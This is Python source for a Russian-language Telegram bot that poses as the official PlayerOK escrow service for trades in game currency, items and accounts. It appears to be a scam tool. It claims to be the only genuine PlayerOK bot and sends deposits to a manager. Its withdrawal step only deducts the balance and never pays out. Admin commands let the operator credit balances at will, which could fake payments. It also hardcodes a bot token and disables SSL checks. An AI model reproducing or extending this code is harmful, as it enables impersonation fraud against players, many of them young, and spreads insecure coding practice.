import urllib.request
import urllib.parse
import json
import time
import random
import html
import ssl

# Отключаем проверку SSL
ssl._create_default_https_context = ssl._create_unverified_context

TOKEN = "8935534470:AAFrUCn-9EVhgSm4FUMfy8vUEX3h1FLcIOQ"
ADMIN_USERNAME = "k13_way"
BASE_URL = "https://api.telegram.org/bot" + TOKEN + "/"

users = {}
states = {}
pending_role = {}
pending_data = {}
active_deals = {}
admins = []
withdraw_data = {}

def escape_html(text):
    return html.escape(str(text))

def api_request(method, params=None, post_data=None):
    url = BASE_URL + method
    if params:
        url += '?' + urllib.parse.urlencode(params)
    req = urllib.request.Request(url)
    if post_data:
        req.add_header('Content-Type', 'application/json')
        req.data = json.dumps(post_data).encode('utf-8')
    try:
        with urllib.request.urlopen(req, timeout=15) as response:
            data = response.read().decode('utf-8')
            return json.loads(data) if data else None
    except Exception as e:
        print(f"⚠️ Ошибка сети [{method}]:", e)
        return None

def send_message(chat_id, text, reply_markup=None, parse_mode='HTML'):
    params = {'chat_id': chat_id, 'text': text, 'parse_mode': parse_mode}
    if reply_markup:
        params['reply_markup'] = json.dumps(reply_markup)
    return api_request('sendMessage', params)

def edit_message_text(chat_id, message_id, text, reply_markup=None, parse_mode='HTML'):
    params = {'chat_id': chat_id, 'message_id': message_id, 'text': text, 'parse_mode': parse_mode}
    if reply_markup:
        params['reply_markup'] = json.dumps(reply_markup)
    return api_request('editMessageText', params)

def answer_callback_query(callback_query_id):
    # Таймаут 5 сек, чтобы кнопка не висела, если сеть лагает
    url = BASE_URL + "answerCallbackQuery?callback_query_id=" + callback_query_id
    try:
        urllib.request.urlopen(url, timeout=5)
    except:
        pass

def get_updates(offset=None, timeout=30):
    params = {'timeout': timeout}
    if offset is not None:
        params['offset'] = offset
    response = api_request('getUpdates', params)
    if response and response.get('ok'):
        return response
    return None

# ================== КЛАВИАТУРЫ ==================
def get_main_menu_keyboard():
    return {
        'inline_keyboard': [
            [{'text': 'Создать Сделку', 'callback_data': 'create_deal'}],
            [
                {'text': 'Кошелек', 'callback_data': 'wallet'},
                {'text': 'Безопасность', 'callback_data': 'security'}
            ],
            [
                {'text': 'Вывод средств', 'callback_data': 'withdraw_menu'},
                {'text': 'Канал', 'callback_data': 'channel'}
            ],
            [
                {'text': 'Поддержка', 'callback_data': 'support'},
                {'text': 'Язык', 'callback_data': 'language'}
            ]
        ]
    }

def get_back_keyboard():
    return {
        'inline_keyboard': [
            [{'text': '🔙 Назад в меню', 'callback_data': 'back'}]
        ]
    }

def get_games_keyboard():
    return {
        'inline_keyboard': [
            [{'text': 'Standoff 2', 'callback_data': 'game_standoff'}],
            [{'text': 'PUBG Mobile', 'callback_data': 'game_pubg'}],
            [{'text': 'Roblox', 'callback_data': 'game_roblox'}],
            [{'text': 'Minecraft (Java, PE)', 'callback_data': 'game_minecraft'}],
            [{'text': 'Genshin Impact', 'callback_data': 'game_genshin'}],
            [{'text': 'Brawl Stars', 'callback_data': 'game_brawl'}],
            [{'text': 'FC Mobile', 'callback_data': 'game_fc'}],
            [{'text': 'Clash of Clans', 'callback_data': 'game_coc'}],
            [{'text': 'Clash Royale', 'callback_data': 'game_cr'}],
            [{'text': '🔙 Назад в меню', 'callback_data': 'back'}]
        ]
    }

def get_category_keyboard(game):
    categories = {
        'standoff': [
            ('Купить/Продать Gold ⭐️', 'gold'),
            ('Купить/Продать Акции 📈', 'akcii'),
            ('Купить/Продать Gold Pass 💵', 'goldpass'),
            ('Купить/Продать Аккаунт 🧑‍💻', 'account'),
            ('Купить/Продать Скин 🗡️', 'skin')
        ],
        'pubg': [
            ('Аккаунт 🎮', 'account'),
            ('UC 💎', 'uc'),
            ('Pass Royale 🎫', 'pass'),
            ('Подписка Prime 🔥', 'prime')
        ],
        'roblox': [
            ('Робуксы 🪙', 'robux'),
            ('Аккаунт 🧑‍💻', 'account'),
            ('Steal A Brainrot 🧠', 'brainrot')
        ],
        'minecraft': [
            ('Лицензия ✅', 'license'),
            ('Аккаунт Microsoft 🧑‍💻', 'account'),
            ('Hypixel ⚔️', 'hypixel')
        ],
        'genshin': [
            ('Персонажи ⚡', 'chars'),
            ('Камни 💎', 'stones'),
            ('Аккаунты 🧑‍💻', 'account'),
            ('Оружие ⚔️', 'weapons')
        ],
        'brawl': [
            ('Гемы 💎', 'gems'),
            ('Brawl Pass 🎫', 'pass'),
            ('Аккаунт 🧑‍💻', 'account'),
            ('Акции 📈', 'akcii')
        ],
        'fc': [
            ('FC Поинты 💵', 'points'),
            ('Звёздный абонемент ⭐', 'star'),
            ('Акции 📈', 'akcii'),
            ('Аккаунт 🧑‍💻', 'account')
        ],
        'coc': [
            ('Гемы 💎', 'gems'),
            ('Аккаунт 🧑‍💻', 'account'),
            ('Золотой пропуск 🏅', 'pass')
        ],
        'cr': [
            ('Карты 🃏', 'cards'),
            ('Аккаунт 🧑‍💻', 'account'),
            ('Пасс 🎫', 'pass')
        ]
    }
    cats = categories.get(game, [])
    keyboard = []
    for label, value in cats:
        keyboard.append([{'text': label, 'callback_data': f'cat_{game}_{value}'}])
    keyboard.append([{'text': '🔙 Назад', 'callback_data': 'back_to_games'}])
    return {'inline_keyboard': keyboard}

def get_role_keyboard():
    return {
        'inline_keyboard': [
            [{'text': 'Я покупаю 🙋', 'callback_data': 'role_buyer'}],
            [{'text': 'Я продаю 🙋‍♂️', 'callback_data': 'role_seller'}]
        ]
    }

def get_accept_reject_keyboard(deal_number):
    return {
        'inline_keyboard': [
            [
                {'text': '✅ Принять сделку', 'callback_data': f'accept_{deal_number}'},
                {'text': '❌ Отменить сделку', 'callback_data': f'reject_{deal_number}'}
            ]
        ]
    }

def get_pay_keyboard(deal_number):
    return {
        'inline_keyboard': [
            [{'text': '💰 Оплатить', 'callback_data': f'pay_{deal_number}'}]
        ]
    }

def get_transferred_keyboard(deal_number):
    return {
        'inline_keyboard': [
            [{'text': 'Я передал 📦', 'callback_data': f'transfer_{deal_number}'}]
        ]
    }

def get_confirm_keyboard(deal_number):
    return {
        'inline_keyboard': [
            [{'text': 'Подтвердить покупку 🎉', 'callback_data': f'confirm_{deal_number}'}]
        ]
    }

def get_empty_keyboard():
    return {'inline_keyboard': []}

def get_wallet_keyboard():
    return {
        'inline_keyboard': [
            [{'text': 'Пополнить 💰', 'callback_data': 'deposit'}],
            [{'text': 'Вывести 💸', 'callback_data': 'withdraw_funds'}],
            [{'text': '🔙 Назад в меню', 'callback_data': 'back'}]
        ]
    }

def get_withdraw_methods_keyboard():
    return {
        'inline_keyboard': [
            [{'text': 'Telegram Кошелек ✈️', 'callback_data': 'withdraw_tg'}],
            [{'text': 'USDT 💲', 'callback_data': 'withdraw_usdt'}],
            [{'text': 'Сайт playerok.com 🛡️', 'callback_data': 'withdraw_site'}],
            [{'text': 'Карта 💳', 'callback_data': 'withdraw_card'}],
            [{'text': '🔙 Назад', 'callback_data': 'back_to_wallet'}]
        ]
    }

# ================== ПРИВЕТСТВИЕ (БЕЗ ФОТО) ==================
def handle_start(chat_id):
    text = (
        "<b>Playerok | Гарант-бот</b>\n\n"
        "<b>Добро пожаловать 🎉</b>\n\n"
        "<blockquote>🛡️ <b>PlayerOK</b> — специализированный сервис по обеспечению безопасности внебиржевых сделок.</blockquote>\n\n"
        "<blockquote>🎁 Автоматизированный алгоритм исполнения.\n"
        "🔒 Скорость и автоматизация.\n"
        "📈 Удобный и быстрый вывод средств.</blockquote>\n\n"
        "<blockquote>• Комиссия сервиса: 10%\n"
        "• Режим работы: 24/7\n"
        "• Поддержка: @playerokevents</blockquote>\n\n"
        "📌 <b>Выберите нужный раздел ниже:</b>"
    )
    reply_markup = get_main_menu_keyboard()
    # Отправляем просто текст
    send_message(chat_id, text, reply_markup)

# ================== ОБРАБОТКА CALLBACK ==================
def process_callback(callback):
    # Сразу убираем часики загрузки
    answer_callback_query(callback['id'])
    
    try:
        user_id = callback['from']['id']
        username = callback['from'].get('username')
        if user_id not in users:
            users[user_id] = {'balance': 0, 'deals': 0, 'username': username or '', 'rating': 5.0, 'reviews_count': 0, 'banned': False}
        
        data = callback['data']
        chat_id = callback['message']['chat']['id']
        message_id = callback['message']['message_id']
        
        print(f"Нажата кнопка: {data}")

        if data == 'back':
            handle_start(chat_id)
            return

        if data == 'create_deal':
            edit_message_text(chat_id, message_id, "🛡️ <b>Выберите категорию</b>", get_games_keyboard())
            return

        if data.startswith('game_'):
            game = data.split('_')[1]
            pending_data[user_id] = {'game': game}
            if game == 'standoff':
                text = "✅ <b>Отлично, категория почти выбрана !</b>\n<b>Выберите нужный раздел</b> ✅"
            else:
                text = f"🎮 <b>Вы выбрали {game.capitalize()}</b>\n\nВыберите категорию для оформления (в разработке)."
            edit_message_text(chat_id, message_id, text, get_category_keyboard(game))
            return

        if data == 'back_to_games':
            edit_message_text(chat_id, message_id, "🛡️ <b>Выберите категорию</b>", get_games_keyboard())
            return

        if data.startswith('cat_'):
            parts = data.split('_')
            game = parts[1]
            cat_code = parts[2]
            if game != 'standoff':
                text = "🎮 <b>Этот раздел пока в разработке.</b>\nСкоро здесь появятся сделки для этой игры и категории.\n\nСледите за обновлениями!"
                edit_message_text(chat_id, message_id, text, get_back_keyboard())
                return
            cat_map = {'gold': 'Gold', 'akcii': 'Акции', 'goldpass': 'Gold Pass', 'account': 'Аккаунт', 'skin': 'Скин'}
            pending_data[user_id]['category'] = cat_map.get(cat_code, 'Gold')
            edit_message_text(chat_id, message_id, "🔥<b>Выберите роль</b>:", get_role_keyboard())
            return

        if data in ('role_buyer', 'role_seller'):
            pending_data[user_id]['role'] = 'buyer' if data == 'role_buyer' else 'seller'
            text = (
                "🔥<b>Отлично, роль выбрана, осталось совсем немного</b>🔥\n\n"
                "✅<b>Напишите в одном предложении @username второго участника, сумму сделки которую вы согласовали, и количество Gold</b>"
            )
            edit_message_text(chat_id, message_id, text, get_back_keyboard())
            states[user_id] = 'awaiting_deal_data'
            return

        if data == 'wallet':
            show_wallet(chat_id, message_id, user_id)
            return

        if data == 'security':
            text = (
                "🛡️<b>Безопасность PlayerOK Гарант</b>\n\n"
                "🤖<b>Мы решили попробовать сферу бота Гаранта в Telegram</b>!\n\n"
                "❓<b>Как работает наш бот в Telegram</b>? <b>Стоит ли доверять ему и людям которые вас привели из сайта</b>? <b>Да, определенно стоит, т.к это наш официальный настоящий бот Гарант PlayerOK</b>!\n\n"
                "📦<b>Сделки стали гораздо легче, а комиссия теперь 10%</b>!\n\n"
                "❗️<b>Наш настоящий Гарант бот всего один, не ведитесь на фейки такие как подделывают нашего бота и пытаются вас обмануть, наш единственный и настоящий бот @PlayerokServiceBot_bot</b>\n\n"
                "🔥<b>Наш настоящий, единственный сайт playerok.com</b>\n\n"
                "❤️<b>Удачных вам сделок в нашей новой сфере продвижения, с любовью PlayerOK</b>"
            )
            edit_message_text(chat_id, message_id, text, get_back_keyboard())
            return

        if data == 'withdraw_menu':
            edit_message_text(chat_id, message_id, "🛡️<b>Выберите категорию вывода</b>:", get_withdraw_methods_keyboard())
            return

        if data.startswith('withdraw_'):
            withdraw_data[user_id] = {'method': data}
            text = (
                "📝 <b>Оформление вывода</b>\n\n"
                "Пожалуйста, введите сумму, ФИО и ваш @username одной строкой через запятую.\n\n"
                "📌 <b>Пример:</b> 5000, Иванов Иван, @ivanov"
            )
            edit_message_text(chat_id, message_id, text, get_back_keyboard())
            states[user_id] = 'awaiting_withdraw_data'
            return

        if data == 'back_to_wallet':
            show_wallet(chat_id, message_id, user_id)
            return

        if data == 'channel':
            edit_message_text(chat_id, message_id, "📢 <b>Наш канал</b>\n\n👉 https://t.me/playerok_com", get_back_keyboard())
            return

        if data == 'support':
            text = "🛡️<b>Поддержка PlayerOK</b>\n\n📌<b>Обращайтесь:</b> @playerokevents\n\n❤️<b>С любовью, PlayerOK</b>"
            edit_message_text(chat_id, message_id, text, get_back_keyboard())
            return

        if data == 'language':
            edit_message_text(chat_id, message_id, "🌐 <b>Выберите язык</b>\n\nДоступен только 🇷🇺 Русский.", get_back_keyboard())
            return

        if data == 'deposit':
            edit_message_text(chat_id, message_id, "🔥 <b>Пополнение</b>\n\n💰 Обратитесь к менеджеру: @playerokevents", get_back_keyboard())
            return

        if data == 'withdraw_funds':
            edit_message_text(chat_id, message_id, "🛡️<b>Выберите категорию вывода</b>:", get_withdraw_methods_keyboard())
            return

        # Сделки
        if data.startswith('accept_'):
            deal_number = int(data.split('_')[1])
            deal = active_deals.get(deal_number)
            if deal and user_id == deal['seller_id']:
                deal['status'] = 'accepted'
                send_message(deal['buyer_id'], f"🎉<b>Продавец принял сделку</b>!\n\n🔢 #{deal_number}\n💵 {deal['amount']} руб.\n📦 {deal['item']}\n\n✅ Ожидайте оплаты.", get_pay_keyboard(deal_number))
                edit_message_text(chat_id, message_id, "✅ Сделка принята. Ждём оплату.", get_empty_keyboard())
            return

        if data.startswith('reject_'):
            deal_number = int(data.split('_')[1])
            deal = active_deals.get(deal_number)
            if deal and user_id == deal['seller_id']:
                send_message(deal['buyer_id'], f"❌ Сделка #{deal_number} отклонена.", get_empty_keyboard())
                del active_deals[deal_number]
                edit_message_text(chat_id, message_id, "❌ Сделка отклонена.", get_empty_keyboard())
            return

        if data.startswith('pay_'):
            deal_number = int(data.split('_')[1])
            deal = active_deals.get(deal_number)
            if deal and user_id == deal['buyer_id']:
                if users[user_id]['balance'] < deal['amount']:
                    send_message(chat_id, f"❌ Недостаточно средств. Баланс: {users[user_id]['balance']} руб.")
                    return
                users[user_id]['balance'] -= deal['amount']
                deal['status'] = 'paid'
                send_message(chat_id, f"✅ Вы оплатили сделку #{deal_number}.")
                send_message(deal['seller_id'], f"✅ Покупатель оплатил сделку #{deal_number}.\nПередайте товар и нажмите 'Я передал'.", get_transferred_keyboard(deal_number))
            return

        if data.startswith('transfer_'):
            deal_number = int(data.split('_')[1])
            deal = active_deals.get(deal_number)
            if deal and user_id == deal['seller_id']:
                deal['status'] = 'transferred'
                send_message(deal['buyer_id'], f"📌 Продавец передал товар #{deal_number}.\nПроверьте и подтвердите.", get_confirm_keyboard(deal_number))
                send_message(chat_id, "✅ Вы отметили передачу.")
            return

        if data.startswith('confirm_'):
            deal_number = int(data.split('_')[1])
            deal = active_deals.get(deal_number)
            if deal and user_id == deal['buyer_id']:
                amount = deal['amount']
                to_seller = round(amount * 0.9, 2)
                users[deal['seller_id']]['balance'] += to_seller
                users[user_id]['deals'] += 1
                del active_deals[deal_number]
                send_message(deal['seller_id'], f"🎉 Покупатель подтвердил сделку!\nЗачислено: {to_seller} руб.\n(Заморозка 48ч).")
                send_message(chat_id, "🎉 Сделка завершена!")
            return
            
    except Exception as e:
        print("!!! ОШИБКА В КНОПКЕ:", e)

def show_wallet(chat_id, message_id, user_id):
    u = users.get(user_id, {'balance': 0, 'deals': 0, 'username': '', 'rating': 5.0, 'reviews_count': 0})
    text = (
        f"💰 <b>Ваш кошелек</b>\n\n"
        f"👤 @{u.get('username') or user_id}\n"
        f"💳 Баланс: <code>{u['balance']} руб.</code>\n"
        f"🤝 Сделки: <code>{u['deals']}</code>\n"
        f"📊 Отзывы: ⭐️ {u['rating']} ({u['reviews_count']})"
    )
    edit_message_text(chat_id, message_id, text, get_wallet_keyboard())

# ================== СООБЩЕНИЯ ==================
def process_message(message):
    chat_id = message['chat']['id']
    user_id = message['from']['id']
    username = message['from'].get('username')
    if user_id not in users:
        users[user_id] = {'balance': 0, 'deals': 0, 'username': username or '', 'rating': 5.0, 'reviews_count': 0, 'banned': False}
    
    text = message.get('text')
    if not text: return

    if text.startswith('/start'):
        handle_start(chat_id)
        return

    is_admin = (username and (username.lower() == ADMIN_USERNAME.lower() or username.lower() in [a.lower() for a in admins]))

    if states.get(user_id) == 'awaiting_withdraw_data':
        parts = [p.strip() for p in text.split(',')]
        if len(parts) < 3:
            send_message(chat_id, "⚠️ Введите: сумма, ФИО, @username")
            return
        try: amount = float(parts[0])
        except: 
            send_message(chat_id, "⚠️ Ошибка в сумме.")
            return
        if users[user_id]['balance'] < amount:
            send_message(chat_id, "❌ Недостаточно средств.")
            states[user_id] = None
            return
        users[user_id]['balance'] -= amount
        states[user_id] = None
        send_message(chat_id, f"✅ Заявка на вывод {amount} руб. принята! Деньги придут в течение 24ч.", get_back_keyboard())
        return

    if text.startswith('/set admin') and is_admin:
        parts = text.split()
        if len(parts) >= 3:
            admins.append(parts[2].lstrip('@'))
            send_message(chat_id, f"✅ @{parts[2].lstrip('@')} теперь админ.")
        return

    if text.startswith('/money') and is_admin:
        parts = text.split()
        if len(parts) >= 3:
            target = parts[1].lstrip('@')
            amount = float(parts[2])
            for uid, data in users.items():
                if data.get('username') and data['username'].lower() == target.lower():
                    data['balance'] += amount
                    send_message(chat_id, f"✅ @{target} начислено {amount}.")
                    return
        return

    if text.startswith('/ban') and is_admin:
        parts = text.split()
        if len(parts) >= 2:
            target = parts[1].lstrip('@')
            for uid, data in users.items():
                if data.get('username') and data['username'].lower() == target.lower():
                    data['banned'] = True
                    send_message(chat_id, f"✅ @{target} забанен.")
                    return
        return

    if states.get(user_id) == 'awaiting_deal_data':
        parts = text.split()
        if len(parts) < 3: return
        target = parts[0].lstrip('@')
        amount = float(parts[1])
        item = ' '.join(parts[2:])
        receiver_id = None
        for uid, d in users.items():
            if d.get('username') and d['username'].lower() == target.lower():
                receiver_id = uid
                break
        if receiver_id is None:
            send_message(chat_id, "❌ Пользователь не найден. Пусть напишет /start.")
            return
        deal_number = random.randint(1000, 9999)
        role = pending_data.get(user_id, {}).get('role', 'buyer')
        if role == 'buyer':
            buyer, seller = user_id, receiver_id
        else:
            seller, buyer = user_id, receiver_id
        active_deals[deal_number] = {'buyer_id': buyer, 'seller_id': seller, 'amount': amount, 'item': item}
        send_message(chat_id, f"✅ Сделка #{deal_number} создана.")
        send_message(receiver_id, f"🎉 Вам предложили сделку #{deal_number} на {amount} руб.\nТовар: {item}", get_accept_reject_keyboard(deal_number))
        states[user_id] = None
        return

    send_message(chat_id, "⚠️ Неизвестная команда.")

def main():
    print("🚀 Бот запущен! Ожидание команд...")
    last_update_id = None
    while True:
        try:
            res = get_updates(offset=last_update_id)
            if res and res.get('result'):
                for upd in res['result']:
                    last_update_id = upd['update_id'] + 1
                    if 'callback_query' in upd:
                        process_callback(upd['callback_query'])
                    elif 'message' in upd:
                        process_message(upd['message'])
            time.sleep(1)
        except Exception as e:
            print("Ошибка в цикле:", e)
            time.sleep(3)

if __name__ == '__main__':
    main()
